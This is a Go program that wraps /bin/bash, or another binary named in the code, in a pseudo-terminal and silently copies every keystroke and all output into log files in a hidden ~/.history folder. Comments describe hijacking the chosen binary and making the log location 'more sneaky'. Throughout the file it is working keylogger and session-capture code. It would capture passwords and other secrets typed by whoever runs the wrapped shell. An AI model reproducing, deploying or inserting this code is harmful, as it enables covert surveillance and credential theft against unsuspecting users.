package main

import (
	"fmt"
	"golang.org/x/term"
	"github.com/creack/pty"
	"io"
	"os"
	"os/signal"
	"os/user"
	"strings"
	"syscall"
	"os/exec"
	"path"
)

func getLogNames() []string {
	pid := os.Getpid()
	bin := os.Args[0]
	usr, _ := user.Current()
	// Log to a hidden folder in the user's home directory.
	// Can be changed to something more sneaky.
	histDir := path.Join(usr.HomeDir, ".history")
	os.Mkdir(histDir, 0755)
	stdioFilename := fmt.Sprintf("%s.%d.i.log", bin, pid)
	stdoutFilename := fmt.Sprintf("%s.%d.o.log", bin, pid)
	return []string { path.Join(histDir, stdioFilename), path.Join(histDir, stdoutFilename) }
}

func run() error {
	// Create arbitrary command.
	var c *exec.Cmd
	// Change this depending on the binary you want to hijack.
	binName := "/bin/bash"

	if len(os.Args) > 1 {
		c = exec.Command(binName, os.Args[1:]...)
	} else {
		c = exec.Command(binName)
	}

	// Start the command with a pty.
	ptmx, err := pty.Start(c)
	if err != nil {
		return err
	}

	// Make sure to close the pty at the end.
	defer func() { _ = ptmx.Close() }() // Best effort.

	// Handle pty size.
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGWINCH)
	go func() {
		for range ch {
			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
				//log.Printf("error resizing pty: %s", err)
			}
		}
	}()
	ch <- syscall.SIGWINCH // Initial resize.

	names := getLogNames()
	// Set stdin in raw mode.
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		return err
	}
	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.

	f, err := os.OpenFile(names[1],
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}

	g, err := os.OpenFile(names[0],
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}

	f.WriteString(strings.Join(os.Args, " ") + "\n")
	wOutErr := io.MultiWriter(os.Stdout, f)
	wInout := io.MultiWriter(ptmx, g)

	defer f.Close()
	defer g.Close()

	// Copy stdin to the pty and the pty to stdout.
	// Note: You can attempt to unify stdio streams,
	//       but stdout gets a copy of stdin on carriage
	//       return, leading to double type. Hence, 2
	//       files are required.
	go func() { _, _ = io.Copy(wInout, os.Stdin) }()
	_, _ = io.Copy(wOutErr, ptmx)

	return nil
}

func main() {
	if err := run(); err != nil {
		return
	}
}